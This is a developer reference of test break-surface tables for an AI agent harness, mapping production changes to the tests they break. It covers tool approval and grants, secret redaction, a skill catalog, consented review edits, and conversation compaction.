| Assert `dispatch.assert_called_once_with(name, params, context=X)` | Fails: actual call also carries `parent_run=RunInfo(...)` and `permission_channel=` | Add `parent_run=ANY, permission_channel=None` to the expectation |
| Assert `approval_needed` was called exactly once per tool call | Fails: §18's headless filter consults it at schema time too | Assert every call received the same context (`call_args_list`), not a count — see `test_context_is_forwarded_to_dispatch_and_approval_needed` |
| Spy/fake `ConversationMemory` lacking `.extra` | `AttributeError: ... no attribute 'extra'` from `with_goal()` | Add `self.extra = {}` to the double (and `set_extra` if it is exercised) |
| `FakeStorage.get_thread` returning a bare truthy sentinel | NOT an `AttributeError`: `ConversationMemory.__init__` reads `extra_data` defensively via `getattr`, so the thread silently gets an empty `.extra` and the failure surfaces LATER as a missing `## Persistent objective` section | Return an object carrying `extra_data` (the fake now mirrors the real row); keep `None` for unknown ids |
| Rename the `## Persistent objective` marker or move goal assembly out of `core.loop.with_goal` | `test_goal_persists_and_injects_into_prompt` fails | The marker lives in `with_goal()` so the CLI wrapper and TUI worker cannot drift; keep both calling it |
| Make `child_context` a union instead of an intersection | `test_ac1_*` fail | C6: intersection, never union — a restricted parent must not escape via a permissive child |
| Remove the `callable_only` drop from `schemas()` | `test_headless_filter_hides_approval_gated_mcp_tool` fails | The headless rule is the §15-17 finalization: uncallable-without-a-channel tools are not advertised, and `headless_hidden()` feeds the once-per-process WARNING |
| Register a dynamically-named probe tool without the `mcp__` prefix in dispatch tests | `ToolCallDenied: ... disabled by policy` | Unknown non-`mcp__` names are denied by design; use `mcp__*` names for probes (allowed by default, approval-gated, so pass an `approval_callback`) |

---

## General regeneration: when a production change breaks several tests at once

If a planned refactor (e.g. ROADMAP §3's JSON-retry, §10's ensemble mode)
breaks multiple tests across multiple files:

1. Read the planned change in ROADMAP.md to understand the NEW contract.
2. Update the canned/pinned values in tests to match the new contract,
   NOT to silently absorb the change.
3. If a regression test (the ROADMAP §4 "three verbatim cases") breaks
   on a planned refactor, that's a signal the refactor is changing a
   guarded invariant — STOP and re-evaluate the refactor against the
   original motivation for the invariant before updating the test.
4. Update this file to document the new break surface for the next
   maintainer.

---

## 14. §14–§18 review fixes

| If you change | You break | Fix |
|---|---|---|
| Remove `ToolSpec.grant_scope` or stop consulting it in `_run()` | `test_s1_grant_means_one_prompt_per_turn_not_per_spawn` | The §18 sign-off asks once per RUN, not per call. The loop learns which tools work that way from `registry.grant_scope()`, never by name |
| Remove `ToolSpec.approval_notice` or the `notice` key on `permission_request` | `test_permission_channel_yields_request_and_dispatches_on_approval` | The event carries `notice` (often `None`). It is what tells the user what approving a spawn actually authorises |
| Add a name to `_INJECTABLE_PARAMS` without adding it to `dispatch()`'s injection map | `KeyError` at dispatch time | Deliberate. The previous ternary silently injected `parent_run` under any third name |
| Make `child_context` replace rather than union `approval_overrides` | `test_s2_parent_approval_tightenings_reach_the_child` | S2: approval composes like tool access. Only `True` entries carry |
| Stop forwarding `permission_channel` from `spawn_subagent` | `test_spawn_forwards_the_channel_and_the_grant` | Without it the child runs headless and loses every approval-gated tool, including all MCP tools |
| Set `ToolApprovals.spawn_subagent = False` again | `test_spawn_subagent_permission_declared` | Approving the spawn IS the sign-off; without it there is nothing to grant against |
| `clear_dynamic_approval_defaults(prefix)` | `TypeError` — it takes exact names now | It over-matched: clearing `mcp__fs__read` also cleared `mcp__fs__read__x`. No-arg still clears all |
| `unregister_all` scanning by prefix again | `test_unregistering_one_server_leaves_a_prefix_sibling_intact` | Server `fs`'s prefix also matches server `fs__read`'s tools |
| Send `effort` without `effort_for()` | `test_run_validates_effort_against_the_model_it_is_about_to_call` | `_run()` is the single enforcement point; every path to the wire goes through it |
| Cache a failed effort lookup | `test_a_failed_lookup_is_not_cached` | One transient error would suppress the capability query for the whole process |
| Return the container unchanged at `_MAX_REDACT_DEPTH` | `TestDepthCapFailsClosed` | The cap stops stack exhaustion; failing open made it a deterministic redaction bypass |
| Drop `"error"` from `_SCANNED_KEYS` | `TestErrorChannelRedaction` | MCP reports failures in band, so third-party text lands there |
| Restore `always_update=True` on `RavenPanel.state` | `test_same_state_reassignment_does_not_redraw_the_raven` | Every token delta reassigns the same value |
| Build `ConversationMemory` in `on_mount` again | `test_launching_and_quitting_persists_no_thread` | Constructing one persists a thread row |

## §25 — authorized tool use in the research pipeline

| Change | What breaks | Fix / why |
|---|---|---|
| Make `registry.grantable()` return True for everything | `TestGrantability`, `TestTheLoopEnforcesGrantability` | A tool deciding approval from its PARAMS was never consented to by name. Ticking "shell" is not agreeing to whatever command the model later picks |
| Drop the `registry.grantable` term from `_run()`'s grant check | `TestTheLoopEnforcesGrantability` (2), `test_candidate_approvals_omits_tools_the_grant_cannot_cover` | The loop is the enforcement point; a stale or hand-built grant set must not widen anything |
| Stop filtering `candidate_approvals()` to grantable tools | `test_candidate_approvals_omits_tools_the_grant_cannot_cover` | The sign-off notice would promise authority the grant does not carry — worse than not offering it |
| Remove `PIPELINE_UNGRANTABLE` / add `spawn_subagent` back | `TestCandidates` | Approving a spawn IS §18's sign-off; pre-granting it unattended compounds one yes into unbounded delegated authority (R4) |
| Skip `grant_budget.take()` in the grant check | `TestGrantBudget` (3) | Pre-flight authorization gives up the natural bound on how many times a granted tool runs |
| Rebuild `GrantBudget` per pass instead of sharing it | `test_one_budget_is_shared_across_passes` | Multiplies the ceiling by the pass count while reading as if it enforced one |
| Make budget exhaustion deny instead of falling through | `test_exhaustion_falls_back_to_asking_not_to_failing`, `test_budget_exhaustion_falls_through_to_the_provider` | The ceiling would become a hard stop on a supervised run |
| `headless = permission_channel is None` again | `TestHeadlessIsAboutBeingUNABLEToAsk` | "Headless" means unable to ask. A pass with an `ApprovalProvider` CAN ask, so hiding its tools reports a limitation it does not have |
| Stop consulting `approval_provider` in `_obtain_approval` | `TestTheProviderAnswers` | `run_to_completion()` discards the `permission_request` event, so a queue alone blocks with nothing displayed |
| Let the provider win over a live `permission_channel` | `test_the_channel_wins_when_both_are_present` | The channel is the more specific arrangement; a provider would ask again about a question already on screen |
| Honour `grant_scope` regardless of the provider | `TestRunScope`, `test_the_provider_declines_run_scope` | R11: a mode whose purpose is per-call supervision must not let one yes cover later calls |
| Drop `authorization=` from `continue_conversation` | `test_the_json_retry_carries_it_into_the_same_thread` | A retry is the same pass continuing; omitting it strips the pass's tools on the attempt where the model is already struggling |
| Drop `**_authorization_kwargs(...)` from `run_deep_research_mode` | `test_the_pass_entry_point_unpacks_the_bundle_into_the_loop` | Every other test mocks over this layer, so all of them pass with the tools still hidden |
| Copy `granted_calls` onto the run at the end instead of sharing the list | `TestTheTrailSurvivesAFailedRun` | The trail would be lost on the failure path and at every §5 checkpoint — the runs most worth auditing |
| Write `granted_calls.json` unconditionally | `test_absent_when_nothing_was_granted` | Its presence is the signal that a run carried pre-flight authorization; an always-empty file gets skimmed past |
| Accept `research.granted_tools` in `settings.json` | `test_granted_tools_is_rejected_by_name` | Standing authorization carried by any cloned repo, in the one config file where project tier beats user tier (R12) |
| Make `--grant` an `nargs="?"` flag again | `TestTheCliFlag` (7) | An optional-value flag eats the next token, so `--grant-tools "my query"` consumed the QUERY and failed about a missing positional |
| Handle `--attended` and `--grant` in a fixed order rather than a loop | `test_the_two_flags_compose_in_either_order` | `--grant --attended q` left "--attended q" as the research question |
| Give `ask_permission_blocking` a private queue | `test_quitting_during_an_attended_research_prompt_releases_the_worker` | `_release_permission_channel` could not see it — a fourth uncovered dismissal route, and the failure is a HANG (f10) |
| Drop `check_input_policy` from `dispatch()` | `TestDispatchEnforcesItBeforeTheHandlerRuns` | Arguments are the one direction that leaves the harness, and nothing was watching it |
| Redact arguments instead of refusing | `test_refused_call_raises_and_the_handler_never_runs` | The tool would run with parameters neither the model nor the user chose, and report success |
| Set `scan_keys=False` on the input path | `test_secret_in_an_argument_key_is_refused` | A dict key is a legal place to put a string and the model writes them |
| Fail open at the input depth cap | `TestInputDepthCapFailsClosed` | Same reasoning as the output cap: refusing to descend must mean refusing to proceed |
| Remove the provenance framing from the universal preamble | `TestProvenanceFraming` | Defence-in-depth only — but it is one line in one place, and every pass inherits it |


## §19 — the skill system

| Change | What breaks | Fix / why |
|---|---|---|
| Make `_md_files` non-recursive for skills | `TestCategoryDiscovery` (5) | Category folders are the payoff: progressive disclosure puts every skill's name in every prompt, so a flat list of forty is what it exists to avoid |
| Make agents recurse too | `test_agents_stay_flat` | K4 is skills-only; `agents/builtin/` holds one file and speculative structure for it is structure nobody asked for |
| Stop deriving `category` from the folder | `TestCategoryDiscovery` (3) | Derived, never authored — a `category:` frontmatter key could disagree with where the file sits |
| Truncate `category` to the immediate parent | `test_nesting_deeper_than_one_level_keeps_the_full_path` | Silently merges two distinct groups in the catalog |
| Drop `dirs.sort()` from the walk | `test_walk_order_is_deterministic` (adversarial-enumeration form, review §19-20 r3-2) and `test_same_name_in_two_categories_collides_and_warns` | Collisions resolve first-wins, so filesystem order would decide WHICH definition loads. The old determinism test re-sorted by path before comparing and could not see this revert; it now monkeypatches the enumeration to present a hostile order and asserts sorted order beats filesystem order |
| Namespace the name by category (`security/recon`) | `test_the_name_is_not_namespaced_by_the_category` | `load_skill`, `/skill` and D18 all key on the name; changing it makes them operate on a different key than the catalog shows |
| Un-group `skill_catalog_text()` | `TestGroupedCatalog` (2) | — |
| Stop marking active skills in the catalog | `test_active_skills_are_marked_not_omitted` | Invites the model to spend a turn calling `load_skill` for a body already pinned into the same prompt |
| Give `SkillManager` session state (mutate the list in place) | `TestManagerHoldsNoState` | K3: the shell owns the active list. A stateful manager is what would make wiring a second shell a redesign rather than a call site |
| Sort activation order | `test_activation_order_is_preserved_not_sorted` | It is the order bodies are pinned in; a user activating general-then-specific is expressing a precedence |
| Pin every discovered skill rather than the active ones | `TestPromptFragment` | Defeats progressive disclosure entirely |
| Raise on an active name that no longer resolves | `test_an_active_name_that_no_longer_resolves_is_skipped` | Skills are rediscovered on `initialize()`; a name can legitimately stop resolving mid-session |
| Make `missing_tools()` ignore the `ToolContext` | `TestMissingTools` (2) | Note AC1's own example (`shell`) CANNOT catch this — it is globally disabled anyway. The discriminating case is a globally allowed tool the agent excluded |
| Make `missing_tools()` answer from anywhere but `registry.is_allowed` | `TestMissingTools` | Reporting one thing at activation and enforcing another mid-turn is the divergence the check exists to prevent |
| Make missing tools REFUSE activation | `test_activation_reports_missing_tools_without_refusing` | K2 reports and proceeds; refusing makes a restrictive agent silently un-pairable with half the catalog |
| **Append active bodies inside `with_catalogs()`** | `TestPromptAssembly`, incl. `test_k6_a_pass_prompt_never_carries_an_active_body` | **K6.** That function feeds `pass_prompt()`, so a skill activated in a TUI chat session would govern all ten passes of a separate research run |
| Stop passing `active_skills` into catalog assembly | `test_the_catalog_marks_active_skills_in_the_same_prompt` | The list must reach the catalog to MARK entries — just never to expand them |
| Make `active_skills` class-level or thread-persisted | `TestSessionScope` | K5: session-scoped like `/agent`, not persisted like `/goal` |
| Give a shipped default a tool it cannot have | `test_their_declared_tools_are_actually_available` | A builtin reporting a missing tool on every activation reads as the feature being broken |


## §20 — post-pipeline review with consented correction

Every row below was applied to the production code and confirmed to turn
the named test red. The paired rows exist because each half alone proves
nothing: "accept re-runs synthesis" passes against a version that always
re-synthesises, and "reject re-runs nothing" passes against one that
never does.

| Change | What breaks | Fix / why |
|---|---|---|
| Make `run_agent_conversation` ignore `authorization=` | `test_the_bundle_is_unpacked_into_the_loop` | §20's reviewer needs the run's grants, provider and budget; without this it runs unauthorised while every call site reads as if it were authorised |
| Drop the `authorization` + `granted_tools` guard | `test_passing_both_raises_rather_than_picking_one` | They set the same underlying argument, so one silently wins |
| Give `pipeline-reviewer` `spawn_subagent` | `test_it_cannot_spawn_subagents` | A reviewer delegating its own review compounds authority for nothing — §25's R4 excludes spawning from pipeline grants for the same reason |
| Declare a globally-denied tool on `pipeline-reviewer` | `test_its_declared_tools_are_actually_available` | `allowed_tools` narrows, so the name is dead weight; a builtin reporting missing tools reads as the feature being broken |
| Let the reviewer read project context or thread memory | `test_it_does_not_read_project_context_or_thread_memory` | Neither is evidence about whether a claim is true, and both are places a steer could be planted |
| Add a `consent` field to `RunAuthorization` | `test_run_authorization_has_no_consent_field` | That bundle answers "may this gated call proceed?"; consent answers "may this edit be applied?". §25's docstring warns against multiplying kinds of authorization inside it |
| Hardcode `pass_prompt(label)` inside the shared retry loop | `test_the_retry_continues_under_the_callers_system_prompt` | Looks right for all ten passes and hands the reviewer a source-grounding prompt mid-review |
| Fire `on_response` only on the final retry | `test_every_retry_response_reaches_the_on_response_hook` | §25's granted-call record hangs off it; a grant spent on the struggling attempt is exactly the call an unattended run's audit trail exists to show |
| **Apply findings when consent is None** | `TestNobodyToAskAppliesNothing` | **V6.** The property that keeps a mutating stage from widening the security stance — the inability to ask is not permission to proceed |
| **Discard findings when consent is None** | `TestNobodyToAskAppliesNothing` | The opposite failure of the same decision. An advisory review whose findings vanish is not advisory, it is discarded |
| **Re-synthesise unconditionally** | `test_reject_leaves_everything_alone` | **V2.** A fully-rejected review must change nothing |
| **Never re-synthesise** | `test_accept_rewrites_the_claim_and_re_runs_synthesis` | **V2, other half.** Otherwise `report.md` and `02_claims.json` contradict each other |
| Reuse the pre-review synthesis input | `test_the_re_synthesis_reads_the_CORRECTED_claims` | Regenerates from the UNCORRECTED claims — the report changes for no reason while the correction silently goes nowhere |
| Skip the `review_override` marker on a tier change | `test_a_tier_override_marks_the_score_breakdown` | `04_confidence.json` then shows a 0.91 raw_score beside a downgraded LOW and reads as a bug in the scoring formula |
| Apply every finding a refinement returns | `test_refinement_touches_only_its_own_finding` | A note about #1 must not silently redraft #2 — the user consented to reconsidering one thing |
| Let `reject_all` keep asking | `test_reject_all_stops_asking` | The escape a long review needs; it only ever declines, so it cannot turn fatigue into a reflexive accept |
| Treat an unrecognised consent answer as accept | `test_an_unrecognised_answer_is_a_rejection` | Every unclear answer is a rejection |
| Treat a raising consent callback as accept | `test_a_consent_callback_that_raises_is_a_rejection` | A shell torn down mid-prompt must not have its silence read as approval |
| Skip validation of `claim_id` / tier before asking | `TestFindingsAreValidatedBeforeAnyoneIsAsked` | Asking solicits consent for something that then silently does nothing |
| Truncate past `MAX_REVIEW_FINDINGS` silently, or not at all | `test_findings_past_the_cap_are_dropped_and_traced` | No silent caps — an untold truncation reads as "the reviewer found twenty-five things" |
| Pass `authorization=None` to the reviewer | `test_the_same_bundle_object_reaches_the_reviewer` | **V7.** Asserted on IDENTITY of the `GrantBudget`: a rebuilt one multiplies the run's ceiling while reading as if it enforced one |
| Run the reviewer (or its retry/refine continuations) with `context=None` | `test_the_reviewer_runs_under_the_reviewer_agents_context` plus the continuation-context tests (review §19-20 r2-1) | Its `.md` excludes `spawn_subagent`, and that only binds if the context built from it is the one EVERY turn of the review uses — turn 1 and every `retry_until_json`/`_refine` continuation. `retry_until_json` therefore takes a `context` parameter and forwards it |
| Stop recording the reviewer's granted calls | `test_the_reviewers_granted_calls_join_the_runs_audit_trail` | §25 keeps ONE list so a call cannot be authorised in one place and recorded in another |
| Make the review stage non-opt-in | `test_no_flag_and_no_consent_means_no_reviewer_call` | D9: it is an extra model call plus a re-synthesis |
| Require the config flag even with a consent route | `test_a_consent_route_alone_enables_it` | A shell that offered the user a consent route should not also need the flag |
| Never call `_review_stage` from the pipeline | `test_the_pipeline_calls_the_stage_after_final_synthesis` | Without this every other §20 test passes against code nothing calls |
| **Run the stage before final synthesis** | `test_the_pipeline_calls_the_stage_after_final_synthesis` | Every call still happens — the reviewer is just handed an empty report to judge. The test asserts ORDER for this reason |
| Make a missing reviewer agent fatal | `test_a_missing_reviewer_agent_skips_rather_than_failing` | Losing a completed ten-pass run over an optional stage is the wrong trade |
| Collapse `enabled` into `review is not None` | `test_enabled_with_no_consent_still_runs_and_reports` | `--review` on a piped run would then skip the review entirely and report nothing |
| Stop falling back to `config.SUBAGENT_REVIEW` | `test_the_pipeline_resolves_the_flag_from_config_when_unset` | Both shells pass `None`, so the config flag would do nothing |
| Default `--review` to `False` in argparse | `test_the_flag_defaults_to_none_so_settings_can_supply_it` | "Flag absent" must stay distinguishable from "flag given as false", or settings.json can never be honoured |
| Let settings beat the explicit flag | `test_precedence_is_flag_then_settings_then_config` | `--no-review` must escape a persisted `true` for one run |
| Build a consent object on a non-tty stdin | `test_a_non_tty_stdin_gets_no_consent_object` | V6 by construction; reading a decision off a pipe answers on the user's behalf with whatever bytes were there |
| Make the TUI decoder trust whatever arrives | `test_the_modal_answer_decoder_fails_safe` | The shutdown release puts a bare `False`; the first place where the unsafe failure is silently applying an edit |
| Let `ReviewScreen`'s escape dismiss with no value | `test_every_review_screen_dismissal_carries_a_decision` | The worker parks on a Queue inside the consent callback — fifth place this invariant applies |
| **Drop `write_run_artifacts` from the TUI worker** | `test_the_tui_worker_writes_them_too` | **V9.** It had ONE call site, so `/research` produced no `/output/<run_id>/` at all |
| Let an artifact failure propagate in the TUI | `test_a_writer_failure_does_not_lose_the_tui_run` | A full disk must not discard ten passes of completed work |
| Write `07_review.json` unconditionally | `test_absent_when_it_was_not` | Its presence is the signal that a run was reviewed; an always-empty file reads as "nothing happened here" |
| Remove `subagent_review` from `_KNOWN_RESEARCH` | `test_subagent_review_is_accepted` | Unknown settings keys RAISE, so an undeclared key is a startup error |

**Signature changes that ripple into existing tests.** `_split_research_flags` now returns `(attended, review, grant_spec, query)` — a 4-tuple, updated across `TestTheTuiFlagSplitter`. `run_deep_research_pipeline` takes `review=` and `subagent_review=`, both asserted positionally in `test_e2e.py` so a future default of "review and apply" cannot slip through. `_review_stage` takes `enabled=`.


## §19–§20 review follow-up (2026-08-05)

Every row applied to the production code and confirmed to turn the named
test red — except the one marked, whose failure mode is a *skip* and which
therefore has a direct test instead. That distinction is the standing
lesson from this pass: a revert check cannot see silence.

| Change | What breaks | Fix / why |
|---|---|---|
| Re-raise on a failed re-synthesis | `test_a_failed_re_synthesis_still_completes_the_run` | A provider error on that one call is the same transient class as a reviewer call failing, which f1 settled must not flip a finished ten-pass run to `failed`. Pinned by a test that composes with the real pipeline — the stage-level test cannot see a status |
| `log_outcomes(committed=True)` on the failure path | `test_a_failed_re_synthesis_leaves_claims_and_report_unchanged` | Traces "accepted and applied" beside claims that were reverted; the record has to agree with what it sits next to |
| Reinstate direct mutation in place of `apply_deferred`'s copy | `test_a_failed_re_synthesis_leaves_claims_and_report_unchanged` | Reopens f4 — a failed re-synthesis persists corrected claims beside the stale report, one run with two contradicting artifacts, durable |
| Count duplicates into the malformed counter | `test_malformed_and_duplicate_are_counted_separately` | A duplicate is a well-formed finding raised twice; one number covering two causes tells the reader neither |
| Go silent on the raced-click timeout branch | `test_the_no_answer_line_only_prints_when_there_was_no_answer` | Their answer went nowhere; silence sends them to the "N applied" summary to work that out and conclude the button is broken |
| **Make `with_catalogs` ignore the context** | `TestCatalogsFollowTheContext` (2) | The catalogs *instruct* the model to call `load_skill` / `spawn_subagent`; a restricted agent is told to call a tool it does not have and burns a denied call against `max_steps` |
| **Suppress both catalogs unconditionally** | `test_an_unrestricted_run_gets_both_catalogs` | **The control.** Without it every other catalog test also passes against a version that strips progressive disclosure from ordinary chat |
| Make `system_prompt_for` drop the context | `test_a_restricted_NON_reviewer_agent_gets_the_same_treatment` | The point of moving this to the producer: the rule must hold for an agent nobody thought about when writing it |
| Have `spawn_subagent` pass its own context, not `child` | `test_a_spawned_subagent_inherits_the_PARENTS_suppression` | C6 intersects with the parent, so a parent that excluded spawning must not have the catalog re-invite its child |
| Pass a context from `pass_prompt()` | `test_pass_prompts_are_unaffected` | The one way this change could reach the research pipeline; verified separately by hashing all ten prompts before and after |
| Drop `test_docs_consistency`'s narrowing guard | `test_the_documented_count_is_the_real_one` | A filtered run legitimately collects fewer; asserting anyway makes every single-file invocation fail |
| Loosen the ARCHITECTURE anchor to a bare `(\d+) tests` | `test_the_three_docs_state_the_same_test_count` | ARCHITECTURE lists a per-module count for every test file in its tree, so a loose pattern compares two unrelated numbers forever |
| Change one doc's count without the others | `test_the_three_docs_state_the_same_test_count` | All three get quoted, by different audiences |
| **Compare `markexpr` against `None`** | `test_the_default_invocation_is_not_treated_as_narrowed` | **Fails by SKIPPING, not by failing** — `pytest.ini`'s addopts always supplies `-m "not integration"`, so every run would skip and the file would look like coverage while the counts drifted. This is why the guard has a direct test rather than a revert-and-see-red |


## Standing: a revert check cannot see a test that SKIPS

The 2026-08-05 follow-up added `tests/test_docs_consistency.py`, whose
narrowing guard decides whether the count assertion runs at all. Get that
guard wrong in the permissive direction and a filtered run asserts against
a session of one item -- loud, obvious, fixed in a minute. Get it wrong in
the restrictive direction and EVERY run skips: the assertion never
executes, the file sits there looking like coverage, and the thing it
polices drifts exactly as before.

Reverting the production behaviour and watching for red cannot catch that,
because a skip is green. Where a test can decline to run, prove it runs --
`test_the_default_invocation_is_not_treated_as_narrowed` is the shape.


## §21a — compaction, the archive, and pinning (2026-08-05)

Every row below was applied to the production code and confirmed to turn the named
test red — 75 across the section's six commits, of which the load-bearing ones are
listed here.

Two rows are marked **CONTROL**. They exist because the assertions next to them pass
against a broken build without them: a version that compacts unconditionally, or one
that shows a summary for threads that were never compacted, satisfies almost every
other test in these files.

| Change | What breaks | Fix / why |
|---|---|---|
| Add a field to a table class without touching `ensure_columns` | `test_a_declared_column_missing_from_an_existing_table_is_added` | `create_all()` creates missing TABLES and never ALTERs. Every database predating the field raises "no such column" at read time, silently, and never on a machine with a fresh `app.db` |
| Drop the `DEFAULT` on an added column | `test_the_existing_row_survives_and_reads_the_declared_default` | SQLite fills existing rows with NULL, so `pinned` reads as None on exactly the messages most likely to be compacted |
| Compare raw type strings instead of affinity | `test_a_length_specifier_is_not_a_type_mismatch` | `VARCHAR(255)` vs `VARCHAR` warns at every startup; a warning that fires when nothing is wrong is one nobody reads when something is |
| Make an unrecognised watermark hide the prefix | `test_an_unrecognised_watermark_shows_everything` | A checkpoint naming a row this thread does not have is a fault. Showing everything costs tokens; hiding a prefix loses context and reports nothing |
| Let `history_through` keep pinned rows | `test_the_summary_span_excludes_pinned_rows` | AC2 — a pinned message is never in what the compactor is asked to summarize |
| Make `pinned_through` ignore its watermark | `test_a_pin_after_the_watermark_is_not_re_added` | The row is already in the tail; returning it twice grows the context compaction just ran to shrink |
| Give `archive_history` a checkpoint lookup | `test_archive_history_ignores_compaction_entirely` | AC1. The first version of this test compared two reads that agree trivially on an uncompacted thread — including under the revert. It now runs against a thread that HAS been compacted, the only state where the guarantee can fail |
| Persist the checkpoint summary as a `MessageLog` row | `test_the_summary_is_never_written_to_the_archive` | Puts derived content in an append-only archive, and the NEXT compaction summarizes the summary as if it were something the user said — chaining by accident on the path that means to re-derive (M8) |
| Drop the pinned re-inclusion from the derived view | `test_a_pinned_row_inside_the_covered_span_comes_back_verbatim` | One watermark cannot say "everything through K except these" (M9). Without it, the message the user explicitly asked to keep is the one that disappears |
| Make the summary an assistant message | `test_the_summary_leads_the_view_as_a_user_message` | The neutral shape has no system role; a leading user message is the one form all three providers accept |
| **Show a summary when there is no checkpoint** | `test_a_thread_with_no_checkpoint_looks_exactly_as_it_did` | **CONTROL.** Every pre-§21 caller resumes an uncompacted thread, and their behaviour must be byte-identical until the trigger first fires |
| Pin only the turn's first row | `test_pinning_one_turn_covers_the_whole_exchange` | A turn is a question and everything that answered it. Keeping the question while the answer is summarized is not what "keep this" means |
| Derive the trigger from `context_limit` | `test_the_trigger_is_a_working_set_target_not_the_window` | M1 — it can never fire there. `MAX_TOKEN_BUDGET` re-bills the whole prompt per step, so the thread is unusable at well under half of any modern window |
| Let a research pass use the working-set trigger | `test_a_research_pass_only_compacts_near_the_window` | M6. A pass is headless and already returns a distillation; routine compaction there spends on a judgment call nobody is watching |
| Remove the re-entrancy guard | `test_the_reentrancy_guard_stops_the_compactor_compacting` | The compactor is an agent, so compacting runs the loop, which evaluates the trigger |
| Make the re-entrancy guard module state again | `test_the_guard_does_not_reach_across_threads` | It was a module flag until batch 75, correctly, because one agent ran at a time. NA9 made two children of one response real, and a shared flag then skips a sibling's compaction and clears the guard under whichever is still folding. `_is_compacting()` / `_set_compacting()`, per thread; the bare `_compacting` name is gone so a stale reader fails instead of silently disabling every compaction |
| Release the guard only on the error path | `test_the_guard_is_released_after_a_compaction` | Left set, every later compaction in the process silently no-ops — a failure that reads as "compaction just never fires" |
| Fold up to the turn start rather than before it | `test_the_fold_boundary_is_always_a_turn_start` | M4. A `tool_result` with no preceding `tool_use` is an HTTP 400 on Anthropic — a hard wire error on the next call, not a degraded answer |
| Ignore any one of the three fold floors | `test_the_current_turn_is_never_foldable`, `test_the_keep_turns_floor_protects_recent_exchanges`, `test_the_keep_tokens_floor_can_win_over_the_turn_floor` | M5 — they compose, earliest wins. The current-turn floor is what makes the mid-turn valve safe by construction |
| Chain when re-derivation was configured (or never chain) | `test_rederive_summarizes_the_originals_not_the_last_summary`, `test_chaining_feeds_the_previous_summary_back_in` | M2. Re-deriving is what keeps exactly one summarization step between an original message and what the model sees |
| Accept an oversized summary without retrying | `test_an_oversized_summary_is_sent_back` | The retry re-enters the compactor's own thread so it sees its own output — §3's loop with a length check in place of a parse |
| Reject an undersized summary too | `test_a_summary_under_target_is_accepted_immediately` | Undershooting has already done the job; rejecting it spends a call to make the context bigger |
| Discard a summary still over target after retries | `test_a_summary_still_oversized_after_retries_is_used_anyway` | It is smaller than what it replaces. Discarding spends every retry and keeps the full history, leaving the thread as stuck with less budget to fix it |
| Record an empty summary as a checkpoint | `test_an_empty_summary_skips_compaction` | Replaces real history with nothing at all — the one outcome worse than not compacting |
| Crash on a missing compactor agent | `test_a_missing_compactor_agent_is_a_skip_not_a_crash` | Same containment §20 applies to a missing reviewer: an optional stage that cannot run must not take the turn down |
| Remove either loop hook | `test_compaction_fires_before_the_first_call_of_a_turn`, `test_the_valve_fires_between_steps_of_one_turn` | M3. The boundary is primary; the valve exists because one turn can add far more than any buffer covers |
| Include the in-progress turn in `_completed_turns` | `test_the_valve_never_folds_the_current_turn` | The off-by-one IS the structural floor |
| Carry notices only on the LoopEvent | `test_the_notice_reaches_the_response_as_well_as_the_event`, `test_the_cli_prints_a_notice_carried_on_the_response` | `run_to_completion()` discards non-final events, so the CLI and the pipeline see only the response. Third time this shape has appeared (§20, §25) |
| Repeat the early warning on every step | `test_the_early_warning_fires_once_and_compacts_nothing` | The condition holds until compaction fires; the same line eight times in one turn trains the reader to skip it |
| Let a failed compaction propagate | `test_a_failed_compaction_does_not_fail_the_turn` | It is a model call, and a provider error during it must not take down a turn that was otherwise fine |
| **Compact unconditionally** | `test_a_thread_under_the_threshold_is_left_alone` | **CONTROL.** Almost every turn is this one |
| Gate `pin` on approval | `test_pin_needs_no_approval_anywhere` | D26. §13 does not merely deny an approval-gated tool where nothing can ask — it stops advertising it, so `pin` would be invisible on the CLI and in every research pass |
| Drop `pin`'s `available_check` | `test_pin_is_hidden_when_there_is_no_compactor` | Pinning is protection FROM compaction; with no compactor it only sets a flag nothing reads — the `fetch_url` defect shape (D24) |
| Check `isinstance(last_n, int)` without excluding bool | `test_a_boolean_count_is_rejected` | `isinstance(True, int)` is True, so `last_n: true` pins one turn while looking understood. Same trap `max_steps` hit in config_loader and column defaults hit in database.py |
| Stop injecting `memory` into dispatch | `test_the_live_memory_is_injected` | `pin` has no other way to reach the thread |
| Skip `effective_compaction`'s relationship checks | `test_an_incoherent_value_is_rejected` (8 cases) | AC8, and §21's own instruction. A `warning_margin` at or above the trigger fires the warning after the thing it warns about |
| Drop the budget-headroom warning | `test_a_trigger_too_close_to_the_budget_warns` | M1's arithmetic, enforced rather than left in a comment |
| Ignore an unknown `/compact` option | `test_an_unrecognised_option_is_an_error` | `--strenght 4` would compact at the default while the user believes otherwise, and the result looks exactly like a compaction that obeyed them |
| Skip `/compact`'s pre-flight validation | `test_an_out_of_range_strength_is_refused_before_a_model_call` | Otherwise `--strength 9` spends a call and fails inside a worker |
| Let `/compact` create a thread | `test_compacting_an_empty_thread_says_so` | Reading `app.memory` persists a `ConversationThread` row for a conversation that never happened — the phantom-thread bug the memory property exists to avoid |
| Leave `_busy` set when a manual compaction fails | `test_a_failed_manual_compaction_releases_the_busy_flag` | The app then refuses every later turn with "still working", which reads as a hang |

### Two standing notes

**`conftest.MEMORY_STORAGE_SYMBOLS` and `FakeMemory` are single-sourced on
purpose.** Both existed as several copies before §21a, and both drifted the moment
production gained a method: five symbols added to `core/memory.py` broke a JSON-retry
test with `'dict' object has no attribute 'desc'`, and three methods added to the
memory contract turned 43 tests red at once. Adding a storage import to
`core/memory.py` means adding one name to that tuple; adding a method the loop calls
on a memory means adding it to `FakeMemory`. Do not re-copy either.

**~~`test_shell_compaction.py` has its own `_settle`, copied rather than imported.~~**
~~`test_tui.py`'s version is TECHNICAL_DEBT theme 8 — it budgets event-loop pumps
rather than time. Importing it would make a fix there silently change this file's
timing too. Whoever fixes theme 8 should fix both.~~

**Superseded 2026-08-07 (TECHNICAL_DEBT 8 closed).** There is now one helper,
`settle` in `tests/conftest.py`, and every pilot test imports it. The note above
was sound while the canonical helper was broken and became exactly wrong when it
was fixed — the argument for copying was "don't couple to something known-bad",
and coupling is the point once it is good. It also under-counted: there were
**five** implementations, not two (budgets 40/60/120/120/200, and
`test_thread_legibility.py`'s was pause-then-check rather than check-then-pause),
so a fix to the one named by filename would have reached one of them.
`test_pilot_wait.py::test_no_test_module_defines_its_own_settle` now enforces
this, because a convention is what produced five copies.

### §21a review pass (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Count turns from `memory.messages` again | `test_compaction_makes_progress_every_time_it_runs` | M11. M8's summary is a `user` message that is not a turn, so a view-derived count is off by one AND in a different space from the archive indices `compactable_span` compares it against. This shipped: the watermark went backwards and the second compaction of a thread un-compacted it |
